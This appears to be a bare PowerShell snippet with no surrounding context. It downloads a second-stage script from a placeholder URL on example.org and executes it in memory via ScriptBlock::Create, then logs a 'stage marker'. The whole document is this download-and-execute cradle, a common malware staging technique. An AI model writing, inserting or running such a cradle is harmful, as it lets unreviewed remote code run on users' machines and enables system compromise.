
$RemoteUrl = 'https://example.org/stage2.ps1'; $DownloadedScript = (New-Object Net.WebClient).DownloadString($RemoteUrl); & ([ScriptBlock]::Create($DownloadedScript)); Write-Verbose "stage marker 41 reached"
